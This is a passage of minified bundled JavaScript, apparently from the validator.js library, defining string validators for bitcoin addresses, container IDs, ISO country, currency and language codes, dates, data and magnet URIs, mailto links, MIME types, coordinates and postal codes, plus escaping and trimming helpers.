            digits_after_decimal: [2],
            allow_space_after_digits: !1
        };
        function a(l, f) {
            return (0,
            o.default)(l),
            f = (0,
            t.default)(f, s),
            n(f).test(l)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ob, Ob.exports)),
    Ob.exports
}
var Rb = {
    exports: {}
}, AO;
function Lle() {
    return AO || (AO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = s;
        var t = o(Ve());
        function o(a) {
            return a && a.__esModule ? a : {
                default: a
            }
        }
        var i = /^(bc1)[a-z0-9]{25,39}$/
          , n = /^(1|3)[A-HJ-NP-Za-km-z1-9]{25,39}$/;
        function s(a) {
            return (0,
            t.default)(a),
            i.test(a) || n.test(a)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Rb, Rb.exports)),
    Rb.exports
}
var If = {}, PO;
function $le() {
    if (PO)
        return If;
    PO = 1,
    Object.defineProperty(If, "__esModule", {
        value: !0
    }),
    If.isFreightContainerID = void 0,
    If.isISO6346 = i;
    var r = e(Ve());
    function e(n) {
        return n && n.__esModule ? n : {
            default: n
        }
    }
    var t = /^[A-Z]{3}(U[0-9]{7})|([J,Z][0-9]{6,7})$/
      , o = /^[0-9]$/;
    function i(n) {
        if ((0,
        r.default)(n),
        n = n.toUpperCase(),
        !t.test(n))
            return !1;
        if (n.length === 11) {
            for (var s = 0, a = 0; a < n.length - 1; a++)
                if (o.test(n[a]))
                    s += n[a] * Math.pow(2, a);
                else {
                    var l = void 0
                      , f = n.charCodeAt(a) - 55;
                    f < 11 ? l = f : f >= 11 && f <= 20 ? l = 12 + f % 11 : f >= 21 && f <= 30 ? l = 23 + f % 21 : l = 34 + f % 31,
                    s += l * Math.pow(2, a)
                }
            var h = s % 11;
            return Number(n[n.length - 1]) === h
        }
        return !0
    }
    return If.isFreightContainerID = i,
    If
}
var Wb = {
    exports: {}
}, CO;
function zle() {
    return CO || (CO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = new Set(["aa", "ab", "ae", "af", "ak", "am", "an", "ar", "as", "av", "ay", "az", "az", "ba", "be", "bg", "bh", "bi", "bm", "bn", "bo", "br", "bs", "ca", "ce", "ch", "co", "cr", "cs", "cu", "cv", "cy", "da", "de", "dv", "dz", "ee", "el", "en", "eo", "es", "et", "eu", "fa", "ff", "fi", "fj", "fo", "fr", "fy", "ga", "gd", "gl", "gn", "gu", "gv", "ha", "he", "hi", "ho", "hr", "ht", "hu", "hy", "hz", "ia", "id", "ie", "ig", "ii", "ik", "io", "is", "it", "iu", "ja", "jv", "ka", "kg", "ki", "kj", "kk", "kl", "km", "kn", "ko", "kr", "ks", "ku", "kv", "kw", "ky", "la", "lb", "lg", "li", "ln", "lo", "lt", "lu", "lv", "mg", "mh", "mi", "mk", "ml", "mn", "mr", "ms", "mt", "my", "na", "nb", "nd", "ne", "ng", "nl", "nn", "no", "nr", "nv", "ny", "oc", "oj", "om", "or", "os", "pa", "pi", "pl", "ps", "pt", "qu", "rm", "rn", "ro", "ru", "rw", "sa", "sc", "sd", "se", "sg", "si", "sk", "sl", "sm", "sn", "so", "sq", "sr", "ss", "st", "su", "sv", "sw", "ta", "te", "tg", "th", "ti", "tk", "tl", "tn", "to", "tr", "ts", "tt", "tw", "ty", "ug", "uk", "ur", "uz", "ve", "vi", "vo", "wa", "wo", "xh", "yi", "yo", "za", "zh", "zu"]);
        function n(s) {
            return (0,
            t.default)(s),
            i.has(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Wb, Wb.exports)),
    Wb.exports
}
var Mb = {
    exports: {}
}, SO;
function jle() {
    return SO || (SO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = a;
        var t = o(Ve());
        function o(l) {
            return l && l.__esModule ? l : {
                default: l
            }
        }
        var i = /^([\+-]?\d{4}(?!\d{2}\b))((-?)((0[1-9]|1[0-2])(\3([12]\d|0[1-9]|3[01]))?|W([0-4]\d|5[0-3])(-?[1-7])?|(00[1-9]|0[1-9]\d|[12]\d{2}|3([0-5]\d|6[1-6])))([T\s]((([01]\d|2[0-3])((:?)[0-5]\d)?|24:?00)([\.,]\d+(?!:))?)?(\17[0-5]\d([\.,]\d+)?)?([zZ]|([\+-])([01]\d|2[0-3]):?([0-5]\d)?)?)?)?$/
          , n = /^([\+-]?\d{4}(?!\d{2}\b))((-?)((0[1-9]|1[0-2])(\3([12]\d|0[1-9]|3[01]))?|W([0-4]\d|5[0-3])(-?[1-7])?|(00[1-9]|0[1-9]\d|[12]\d{2}|3([0-5]\d|6[1-6])))([T]((([01]\d|2[0-3])((:?)[0-5]\d)?|24:?00)([\.,]\d+(?!:))?)?(\17[0-5]\d([\.,]\d+)?)?([zZ]|([\+-])([01]\d|2[0-3]):?([0-5]\d)?)?)?)?$/
          , s = function(f) {
            var h = f.match(/^(\d{4})-?(\d{3})([ T]{1}\.*|$)/);
            if (h) {
                var p = Number(h[1])
                  , b = Number(h[2]);
                return p % 4 === 0 && p % 100 !== 0 || p % 400 === 0 ? b <= 366 : b <= 365
            }
            var v = f.match(/(\d{4})-?(\d{0,2})-?(\d*)/).map(Number)
              , T = v[1]
              , x = v[2]
              , E = v[3]
              , B = x && "0".concat(x).slice(-2)
              , P = E && "0".concat(E).slice(-2)
              , O = new Date("".concat(T, "-").concat(B || "01", "-").concat(P || "01"));
            return x && E ? O.getUTCFullYear() === T && O.getUTCMonth() + 1 === x && O.getUTCDate() === E : !0
        };
        function a(l) {
            var f = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            (0,
            t.default)(l);
            var h = f.strictSeparator ? n.test(l) : i.test(l);
            return h && f.strict ? s(l) : h
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Mb, Mb.exports)),
    Mb.exports
}
var Nb = {
    exports: {}
}, BO;
function qle() {
    return BO || (BO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = B;
        var t = o(Ve());
        function o(P) {
            return P && P.__esModule ? P : {
                default: P
            }
        }
        var i = /[0-9]{4}/
          , n = /(0[1-9]|1[0-2])/
          , s = /([12]\d|0[1-9]|3[01])/
          , a = /([01][0-9]|2[0-3])/
          , l = /[0-5][0-9]/
          , f = /([0-5][0-9]|60)/
          , h = /(\.[0-9]+)?/
          , p = new RegExp("[-+]".concat(a.source, ":").concat(l.source))
          , b = new RegExp("([zZ]|".concat(p.source, ")"))
          , v = new RegExp("".concat(a.source, ":").concat(l.source, ":").concat(f.source).concat(h.source))
          , T = new RegExp("".concat(i.source, "-").concat(n.source, "-").concat(s.source))
          , x = new RegExp("".concat(v.source).concat(b.source))
          , E = new RegExp("^".concat(T.source, "[ tT]").concat(x.source, "$"));
        function B(P) {
            return (0,
            t.default)(P),
            E.test(P)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Nb, Nb.exports)),
    Nb.exports
}
var Db = {
    exports: {}
}, _O;
function Vle() {
    return _O || (_O = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = new Set(["AFG", "ALA", "ALB", "DZA", "ASM", "AND", "AGO", "AIA", "ATA", "ATG", "ARG", "ARM", "ABW", "AUS", "AUT", "AZE", "BHS", "BHR", "BGD", "BRB", "BLR", "BEL", "BLZ", "BEN", "BMU", "BTN", "BOL", "BES", "BIH", "BWA", "BVT", "BRA", "IOT", "BRN", "BGR", "BFA", "BDI", "KHM", "CMR", "CAN", "CPV", "CYM", "CAF", "TCD", "CHL", "CHN", "CXR", "CCK", "COL", "COM", "COG", "COD", "COK", "CRI", "CIV", "HRV", "CUB", "CUW", "CYP", "CZE", "DNK", "DJI", "DMA", "DOM", "ECU", "EGY", "SLV", "GNQ", "ERI", "EST", "ETH", "FLK", "FRO", "FJI", "FIN", "FRA", "GUF", "PYF", "ATF", "GAB", "GMB", "GEO", "DEU", "GHA", "GIB", "GRC", "GRL", "GRD", "GLP", "GUM", "GTM", "GGY", "GIN", "GNB", "GUY", "HTI", "HMD", "VAT", "HND", "HKG", "HUN", "ISL", "IND", "IDN", "IRN", "IRQ", "IRL", "IMN", "ISR", "ITA", "JAM", "JPN", "JEY", "JOR", "KAZ", "KEN", "KIR", "PRK", "KOR", "KWT", "KGZ", "LAO", "LVA", "LBN", "LSO", "LBR", "LBY", "LIE", "LTU", "LUX", "MAC", "MKD", "MDG", "MWI", "MYS", "MDV", "MLI", "MLT", "MHL", "MTQ", "MRT", "MUS", "MYT", "MEX", "FSM", "MDA", "MCO", "MNG", "MNE", "MSR", "MAR", "MOZ", "MMR", "NAM", "NRU", "NPL", "NLD", "NCL", "NZL", "NIC", "NER", "NGA", "NIU", "NFK", "MNP", "NOR", "OMN", "PAK", "PLW", "PSE", "PAN", "PNG", "PRY", "PER", "PHL", "PCN", "POL", "PRT", "PRI", "QAT", "REU", "ROU", "RUS", "RWA", "BLM", "SHN", "KNA", "LCA", "MAF", "SPM", "VCT", "WSM", "SMR", "STP", "SAU", "SEN", "SRB", "SYC", "SLE", "SGP", "SXM", "SVK", "SVN", "SLB", "SOM", "ZAF", "SGS", "SSD", "ESP", "LKA", "SDN", "SUR", "SJM", "SWZ", "SWE", "CHE", "SYR", "TWN", "TJK", "TZA", "THA", "TLS", "TGO", "TKL", "TON", "TTO", "TUN", "TUR", "TKM", "TCA", "TUV", "UGA", "UKR", "ARE", "GBR", "USA", "UMI", "URY", "UZB", "VUT", "VEN", "VNM", "VGB", "VIR", "WLF", "ESH", "YEM", "ZMB", "ZWE"]);
        function n(s) {
            return (0,
            t.default)(s),
            i.has(s.toUpperCase())
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Db, Db.exports)),
    Db.exports
}
var Of = {}, IO;
function Hle() {
    if (IO)
        return Of;
    IO = 1,
    Object.defineProperty(Of, "__esModule", {
        value: !0
    }),
    Of.CurrencyCodes = void 0,
    Of.default = o;
    var r = e(Ve());
    function e(i) {
        return i && i.__esModule ? i : {
            default: i
        }
    }
    var t = new Set(["AED", "AFN", "ALL", "AMD", "ANG", "AOA", "ARS", "AUD", "AWG", "AZN", "BAM", "BBD", "BDT", "BGN", "BHD", "BIF", "BMD", "BND", "BOB", "BOV", "BRL", "BSD", "BTN", "BWP", "BYN", "BZD", "CAD", "CDF", "CHE", "CHF", "CHW", "CLF", "CLP", "CNY", "COP", "COU", "CRC", "CUC", "CUP", "CVE", "CZK", "DJF", "DKK", "DOP", "DZD", "EGP", "ERN", "ETB", "EUR", "FJD", "FKP", "GBP", "GEL", "GHS", "GIP", "GMD", "GNF", "GTQ", "GYD", "HKD", "HNL", "HRK", "HTG", "HUF", "IDR", "ILS", "INR", "IQD", "IRR", "ISK", "JMD", "JOD", "JPY", "KES", "KGS", "KHR", "KMF", "KPW", "KRW", "KWD", "KYD", "KZT", "LAK", "LBP", "LKR", "LRD", "LSL", "LYD", "MAD", "MDL", "MGA", "MKD", "MMK", "MNT", "MOP", "MRU", "MUR", "MVR", "MWK", "MXN", "MXV", "MYR", "MZN", "NAD", "NGN", "NIO", "NOK", "NPR", "NZD", "OMR", "PAB", "PEN", "PGK", "PHP", "PKR", "PLN", "PYG", "QAR", "RON", "RSD", "RUB", "RWF", "SAR", "SBD", "SCR", "SDG", "SEK", "SGD", "SHP", "SLE", "SLL", "SOS", "SRD", "SSP", "STN", "SVC", "SYP", "SZL", "THB", "TJS", "TMT", "TND", "TOP", "TRY", "TTD", "TWD", "TZS", "UAH", "UGX", "USD", "USN", "UYI", "UYU", "UYW", "UZS", "VES", "VND", "VUV", "WST", "XAF", "XAG", "XAU", "XBA", "XBB", "XBC", "XBD", "XCD", "XDR", "XOF", "XPD", "XPF", "XPT", "XSU", "XTS", "XUA", "XXX", "YER", "ZAR", "ZMW", "ZWL"]);
    function o(i) {
        return (0,
        r.default)(i),
        t.has(i.toUpperCase())
    }
    return Of.CurrencyCodes = t,
    Of
}
var Fb = {
    exports: {}
}, OO;
function Gle() {
    return OO || (OO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = l;
        var t = i(Ve())
          , o = i(wo());
        function i(f) {
            return f && f.__esModule ? f : {
                default: f
            }
        }
        var n = /^[A-Z2-7]+=*$/
          , s = /^[A-HJKMNP-TV-Z0-9]+$/
          , a = {
            crockford: !1
        };
        function l(f, h) {
            if ((0,
            t.default)(f),
            h = (0,
            o.default)(h, a),
            h.crockford)
                return s.test(f);
            var p = f.length;
            return !!(p % 8 === 0 && n.test(f))
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Fb, Fb.exports)),
    Fb.exports
}
var Ub = {
    exports: {}
}, RO;
function Kle() {
    return RO || (RO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = /^[A-HJ-NP-Za-km-z1-9]*$/;
        function n(s) {
            return (0,
            t.default)(s),
            !!i.test(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Ub, Ub.exports)),
    Ub.exports
}
var kb = {
    exports: {}
}, WO;
function Zle() {
    return WO || (WO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = a;
        var t = o(Ve());
        function o(l) {
            return l && l.__esModule ? l : {
                default: l
            }
        }
        var i = /^[a-z]+\/[a-z0-9\-\+\._]+$/i
          , n = /^[a-z\-]+=[a-z0-9\-]+$/i
          , s = /^[a-z0-9!\$&'\(\)\*\+,;=\-\._~:@\/\?%\s]*$/i;
        function a(l) {
            (0,
            t.default)(l);
            var f = l.split(",");
            if (f.length < 2)
                return !1;
            var h = f.shift().trim().split(";")
              , p = h.shift();
            if (p.slice(0, 5) !== "data:")
                return !1;
            var b = p.slice(5);
            if (b !== "" && !i.test(b))
                return !1;
            for (var v = 0; v < h.length; v++)
                if (!(v === h.length - 1 && h[v].toLowerCase() === "base64") && !n.test(h[v]))
                    return !1;
            for (var T = 0; T < f.length; T++)
                if (!s.test(f[T]))
                    return !1;
            return !0
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(kb, kb.exports)),
    kb.exports
}
var Lb = {
    exports: {}
}, MO;
function Yle() {
    return MO || (MO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = o(Ve());
        function o(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        var i = /(?:^magnet:\?|[^?&]&)xt(?:\.1)?=urn:(?:(?:aich|bitprint|btih|ed2k|ed2khash|kzhash|md5|sha1|tree:tiger):[a-z0-9]{32}(?:[a-z0-9]{8})?|btmh:1220[a-z0-9]{64})(?:$|&)/i;
        function n(s) {
            return (0,
            t.default)(s),
            s.indexOf("magnet:?") !== 0 ? !1 : i.test(s)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Lb, Lb.exports)),
    Lb.exports
}
var $b = {
    exports: {}
}, zb = {
    exports: {}
}, jb = {
    exports: {}
}, NO;
function jD() {
    return NO || (NO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            if ((0,
            t.default)(n),
            s) {
                var a = new RegExp("[".concat(s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "]+$"),"g");
                return n.replace(a, "")
            }
            for (var l = n.length - 1; /\s/.test(n.charAt(l)); )
                l -= 1;
            return n.slice(0, l + 1)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(jb, jb.exports)),
    jb.exports
}
var qb = {
    exports: {}
}, DO;
function qD() {
    return DO || (DO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            (0,
            t.default)(n);
            var a = s ? new RegExp("^[".concat(s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "]+"),"g") : /^\s+/g;
            return n.replace(a, "")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(qb, qb.exports)),
    qb.exports
}
var FO;
function VD() {
    return FO || (FO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = i(jD())
          , o = i(qD());
        function i(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        function n(s, a) {
            return (0,
            t.default)((0,
            o.default)(s, a), a)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(zb, zb.exports)),
    zb.exports
}
var UO;
function Xle() {
    return UO || (UO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = T;
        var t = n(VD())
          , o = n(MD())
          , i = n(Ve());
        function n(x) {
            return x && x.__esModule ? x : {
                default: x
            }
        }
        function s(x, E) {
            return f(x) || l(x, E) || p(x, E) || a()
        }
        function a() {
            throw new TypeError(`Invalid attempt to destructure non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
        }
        function l(x, E) {
            var B = x == null ? null : typeof Symbol < "u" && x[Symbol.iterator] || x["@@iterator"];
            if (B != null) {
                var P, O, F, D, I = [], M = !0, C = !1;
                try {
                    if (F = (B = B.call(x)).next,
                    E !== 0)
                        for (; !(M = (P = F.call(B)).done) && (I.push(P.value),
                        I.length !== E); M = !0)
                            ;
                } catch (W) {
                    C = !0,
                    O = W
                } finally {
                    try {
                        if (!M && B.return != null && (D = B.return(),
                        Object(D) !== D))
                            return
                    } finally {
                        if (C)
                            throw O
                    }
                }
                return I
            }
        }
        function f(x) {
            if (Array.isArray(x))
                return x
        }
        function h(x, E) {
            var B = typeof Symbol < "u" && x[Symbol.iterator] || x["@@iterator"];
            if (!B) {
                if (Array.isArray(x) || (B = p(x)) || E) {
                    B && (x = B);
                    var P = 0
                      , O = function() {};
                    return {
                        s: O,
                        n: function() {
                            return P >= x.length ? {
                                done: !0
                            } : {
                                done: !1,
                                value: x[P++]
                            }
                        },
                        e: function(C) {
                            throw C
                        },
                        f: O
                    }
                }
                throw new TypeError(`Invalid attempt to iterate non-iterable instance.
In order to be iterable, non-array objects must have a [Symbol.iterator]() method.`)
            }
            var F = !0, D = !1, I;
            return {
                s: function() {
                    B = B.call(x)
                },
                n: function() {
                    var C = B.next();
                    return F = C.done,
                    C
                },
                e: function(C) {
                    D = !0,
                    I = C
                },
                f: function() {
                    try {
                        !F && B.return != null && B.return()
                    } finally {
                        if (D)
                            throw I
                    }
                }
            }
        }
        function p(x, E) {
            if (x) {
                if (typeof x == "string")
                    return b(x, E);
                var B = Object.prototype.toString.call(x).slice(8, -1);
                if (B === "Object" && x.constructor && (B = x.constructor.name),
                B === "Map" || B === "Set")
                    return Array.from(x);
                if (B === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(B))
                    return b(x, E)
            }
        }
        function b(x, E) {
            (E == null || E > x.length) && (E = x.length);
            for (var B = 0, P = new Array(E); B < E; B++)
                P[B] = x[B];
            return P
        }
        function v(x) {
            var E = new Set(["subject", "body", "cc", "bcc"])
              , B = {
                cc: "",
                bcc: ""
            }
              , P = !1
              , O = x.split("&");
            if (O.length > 4)
                return !1;
            var F = h(O), D;
            try {
                for (F.s(); !(D = F.n()).done; ) {
                    var I = D.value
                      , M = I.split("=")
                      , C = s(M, 2)
                      , W = C[0]
                      , k = C[1];
                    if (W && !E.has(W)) {
                        P = !0;
                        break
                    }
                    k && (W === "cc" || W === "bcc") && (B[W] = k),
                    W && E.delete(W)
                }
            } catch (H) {
                F.e(H)
            } finally {
                F.f()
            }
            return P ? !1 : B
        }
        function T(x, E) {
            if ((0,
            i.default)(x),
            x.indexOf("mailto:") !== 0)
                return !1;
            var B = x.replace("mailto:", "").split("?")
              , P = s(B, 2)
              , O = P[0]
              , F = P[1]
              , D = F === void 0 ? "" : F;
            if (!O && !D)
                return !0;
            var I = v(D);
            return I ? "".concat(O, ",").concat(I.cc, ",").concat(I.bcc).split(",").every(function(M) {
                return M = (0,
                t.default)(M, " "),
                M ? (0,
                o.default)(M, E) : !0
            }) : !1
        }
        r.exports = e.default,
        r.exports.default = e.default
    }($b, $b.exports)),
    $b.exports
}
var Vb = {
    exports: {}
}, kO;
function Jle() {
    return kO || (kO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = a;
        var t = o(Ve());
        function o(l) {
            return l && l.__esModule ? l : {
                default: l
            }
        }
        var i = /^(application|audio|font|image|message|model|multipart|text|video)\/[a-zA-Z0-9\.\-\+_]{1,100}$/i
          , n = /^text\/[a-zA-Z0-9\.\-\+]{1,100};\s?charset=("[a-zA-Z0-9\.\-\+\s]{0,70}"|[a-zA-Z0-9\.\-\+]{0,70})(\s?\([a-zA-Z0-9\.\-\+\s]{1,20}\))?$/i
          , s = /^multipart\/[a-zA-Z0-9\.\-\+]{1,100}(;\s?(boundary|charset)=("[a-zA-Z0-9\.\-\+\s]{0,70}"|[a-zA-Z0-9\.\-\+]{0,70})(\s?\([a-zA-Z0-9\.\-\+\s]{1,20}\))?){0,2}$/i;
        function a(l) {
            return (0,
            t.default)(l),
            i.test(l) || n.test(l) || s.test(l)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Vb, Vb.exports)),
    Vb.exports
}
var Hb = {
    exports: {}
}, LO;
function Qle() {
    return LO || (LO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = h;
        var t = i(Ve())
          , o = i(wo());
        function i(p) {
            return p && p.__esModule ? p : {
                default: p
            }
        }
        var n = /^\(?[+-]?(90(\.0+)?|[1-8]?\d(\.\d+)?)$/
          , s = /^\s?[+-]?(180(\.0+)?|1[0-7]\d(\.\d+)?|\d{1,2}(\.\d+)?)\)?$/
          , a = /^(([1-8]?\d)\D+([1-5]?\d|60)\D+([1-5]?\d|60)(\.\d+)?|90\D+0\D+0)\D+[NSns]?$/i
          , l = /^\s*([1-7]?\d{1,2}\D+([1-5]?\d|60)\D+([1-5]?\d|60)(\.\d+)?|180\D+0\D+0)\D+[EWew]?$/i
          , f = {
            checkDMS: !1
        };
        function h(p, b) {
            if ((0,
            t.default)(p),
            b = (0,
            o.default)(b, f),
            !p.includes(","))
                return !1;
            var v = p.split(",");
            return v[0].startsWith("(") && !v[1].endsWith(")") || v[1].endsWith(")") && !v[0].startsWith("(") ? !1 : b.checkDMS ? a.test(v[0]) && l.test(v[1]) : n.test(v[0]) && s.test(v[1])
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Hb, Hb.exports)),
    Hb.exports
}
var Rf = {}, $O;
function eue() {
    if ($O)
        return Rf;
    $O = 1,
    Object.defineProperty(Rf, "__esModule", {
        value: !0
    }),
    Rf.default = a,
    Rf.locales = void 0;
    var r = e(Ve());
    function e(l) {
        return l && l.__esModule ? l : {
            default: l
        }
    }
    var t = /^\d{3}$/
      , o = /^\d{4}$/
      , i = /^\d{5}$/
      , n = /^\d{6}$/
      , s = {
        AD: /^AD\d{3}$/,
        AT: o,
        AU: o,
        AZ: /^AZ\d{4}$/,
        BA: /^([7-8]\d{4}$)/,
        BE: o,
        BG: o,
        BR: /^\d{5}-\d{3}$/,
        BY: /^2[1-4]\d{4}$/,
        CA: /^[ABCEGHJKLMNPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][\s\-]?\d[ABCEGHJ-NPRSTV-Z]\d$/i,
        CH: o,
        CN: /^(0[1-7]|1[012356]|2[0-7]|3[0-6]|4[0-7]|5[1-7]|6[1-7]|7[1-5]|8[1345]|9[09])\d{4}$/,
        CZ: /^\d{3}\s?\d{2}$/,
        DE: i,
        DK: o,
        DO: i,
        DZ: i,
        EE: i,
        ES: /^(5[0-2]{1}|[0-4]{1}\d{1})\d{3}$/,
        FI: i,
        FR: /^\d{2}\s?\d{3}$/,
        GB: /^(gir\s?0aa|[a-z]{1,2}\d[\da-z]?\s?(\d[a-z]{2})?)$/i,
        GR: /^\d{3}\s?\d{2}$/,
        HR: /^([1-5]\d{4}$)/,
        HT: /^HT\d{4}$/,
        HU: o,
        ID: i,
        IE: /^(?!.*(?:o))[A-Za-z]\d[\dw]\s\w{4}$/i,
        IL: /^(\d{5}|\d{7})$/,
        IN: /^((?!10|29|35|54|55|65|66|86|87|88|89)[1-9][0-9]{5})$/,
        IR: /^(?!(\d)\1{3})[13-9]{4}[1346-9][013-9]{5}$/,
        IS: t,
        IT: i,
        JP: /^\d{3}\-\d{4}$/,
        KE: i,
        KR: /^(\d{5}|\d{6})$/,
        LI: /^(948[5-9]|949[0-7])$/,
        LT: /^LT\-\d{5}$/,
        LU: o,
        LV: /^LV\-\d{4}$/,
        LK: i,
        MG: t,
        MX: i,
        MT: /^[A-Za-z]{3}\s{0,1}\d{4}$/,
        MY: i,
        NL: /^[1-9]\d{3}\s?(?!sa|sd|ss)[a-z]{2}$/i,
        NO: o,
        NP: /^(10|21|22|32|33|34|44|45|56|57)\d{3}$|^(977)$/i,
        NZ: o,
        PL: /^\d{2}\-\d{3}$/,
        PR: /^00[679]\d{2}([ -]\d{4})?$/,
        PT: /^\d{4}\-\d{3}?$/,
        RO: n,
        RU: n,
        SA: i,
        SE: /^[1-9]\d{2}\s?\d{2}$/,
        SG: n,
        SI: o,
        SK: /^\d{3}\s?\d{2}$/,
        TH: i,
        TN: o,
        TW: /^\d{3}(\d{2})?$/,
        UA: i,
        US: /^\d{5}(-\d{4})?$/,
        ZA: o,
        ZM: i
    };
    Rf.locales = Object.keys(s);
    function a(l, f) {
        if ((0,
        r.default)(l),
        f in s)
            return s[f].test(l);
        if (f === "any") {
            for (var h in s)
                if (s.hasOwnProperty(h)) {
                    var p = s[h];
                    if (p.test(l))
                        return !0
                }
            return !1
        }
        throw new Error("Invalid locale '".concat(f, "'"))
    }
    return Rf
}
var Gb = {
    exports: {}
}, zO;
function tue() {
    return zO || (zO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n) {
            return (0,
            t.default)(n),
            n.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/'/g, "&#x27;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/\//g, "&#x2F;").replace(/\\/g, "&#x5C;").replace(/`/g, "&#96;")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Gb, Gb.exports)),
    Gb.exports
}
var Kb = {
    exports: {}
}, jO;
function rue() {
    return jO || (jO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n) {
            return (0,
            t.default)(n),
            n.replace(/&quot;/g, '"').replace(/&#x27;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&#x2F;/g, "/").replace(/&#x5C;/g, "\\").replace(/&#96;/g, "`").replace(/&amp;/g, "&")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Kb, Kb.exports)),
    Kb.exports
}
var Zb = {
    exports: {}
}, Yb = {
    exports: {}
}, qO;
function HD() {
    return qO || (qO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            return (0,
            t.default)(n),
            n.replace(new RegExp("[".concat(s, "]+"),"g"), "")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Yb, Yb.exports)),
    Yb.exports
}
var VO;
function nue() {
    return VO || (VO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = n;
        var t = i(Ve())
          , o = i(HD());
        function i(s) {
            return s && s.__esModule ? s : {
                default: s
            }
        }
        function n(s, a) {
            (0,
            t.default)(s);
            var l = a ? "\\x00-\\x09\\x0B\\x0C\\x0E-\\x1F\\x7F" : "\\x00-\\x1F\\x7F";
            return (0,
            o.default)(s, l)
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Zb, Zb.exports)),
    Zb.exports
}
var Xb = {
    exports: {}
}, HO;
function oue() {
    return HO || (HO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            return (0,
            t.default)(n),
            n.replace(new RegExp("[^".concat(s, "]+"),"g"), "")
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Xb, Xb.exports)),
    Xb.exports
}
var Jb = {
    exports: {}
}, GO;
function iue() {
    return GO || (GO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
        e.default = i;
        var t = o(Ve());
        function o(n) {
            return n && n.__esModule ? n : {
                default: n
            }
        }
        function i(n, s) {
            (0,
            t.default)(n);
            for (var a = n.length - 1; a >= 0; a--)
                if (s.indexOf(n[a]) === -1)
                    return !1;
            return !0
        }
        r.exports = e.default,
        r.exports.default = e.default
    }(Jb, Jb.exports)),
    Jb.exports
}
var Qb = {
    exports: {}
}, KO;
function sue() {
    return KO || (KO = 1,
    function(r, e) {
        Object.defineProperty(e, "__esModule", {
            value: !0
        }),
